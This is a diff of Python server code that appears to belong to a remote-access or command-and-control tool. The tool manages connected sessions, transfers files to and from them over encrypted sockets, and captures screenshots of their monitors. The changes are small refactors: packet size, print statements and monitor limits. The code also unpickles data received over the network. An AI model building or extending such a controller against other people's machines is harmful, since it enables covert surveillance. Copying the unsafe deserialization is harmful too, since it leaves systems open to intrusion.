@@ -1,5 +1,4 @@
 # standard python libraries
-import sys
 import base64
 import socket
 import pickle
@@ -102,7 +101,7 @@ class Server:
                    "data": bytes()}
         try:
             with open(path_to_open, "rb") as file:
-                request["data"] = base64.b64encode(file.read()).decode(self.connection.CODEC)
+                request["data"] = base64.b64encode(file.read()).decode("utf8")
         except FileNotFoundError:
             self.user_interface.perror("FileNotFoundError")
         except PermissionError:
@@ -226,8 +225,7 @@ class Server:
 
 class Connection:
     def __init__(self, user_interface):
-        self.CODEC = "utf8"
-        self.PACKET_SIZE = 1024
+        self.PACKET_SIZE = 4096
         self.sessions = []
         self.blocked_ips = set()
         self.user_interface = user_interface
@@ -316,9 +314,7 @@ class Connection:
             connection.recv(self.PACKET_SIZE)
             for packet_number in range(total_packets):
                 connection.sendall(data[packet_number * self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
-                sys.stdout.write(
-                    f"\r[↑] {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}%)")
-                sys.stdout.flush()
+                print(f"\r[↑] {self.format_byte_length(len_data_total)} → {packet_number + 1 / (total_packets / 100)}%", end="")
                 print()
         except socket.error as error:
             self.user_interface.perror(f"SocketError from session {self.get_index_by_connection(connection)}: {error}")
@@ -331,9 +327,7 @@ class Connection:
             connection.send("READY".encode("utf8"))
             for _ in range(math.ceil(header / self.PACKET_SIZE)):
                 data.extend(connection.recv(self.PACKET_SIZE))
-                sys.stdout.write(
-                    f"\r[↓] {self.format_byte_length(header)} ({round(len(data) / (header / 100), 1)}% complete)")
-                sys.stdout.flush()
+                print(f"\r[↓] {self.format_byte_length(header)} → {round(len(data) / (header / 100), 1)}%", end="")
                 print()
             received_dict = pickle.loads(self.decrypt(bytes(data), self.get_crypter_by_connection(connection)))
 
@@ -404,7 +398,7 @@ class UserInterface(cmd2.Cmd):
     up_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     screen_parser = argparse.ArgumentParser(prog="screen")
-    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 100),
+    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 6),
                                help="monitor to capture (-1 for all)")
     screen_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the picture in")
     screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
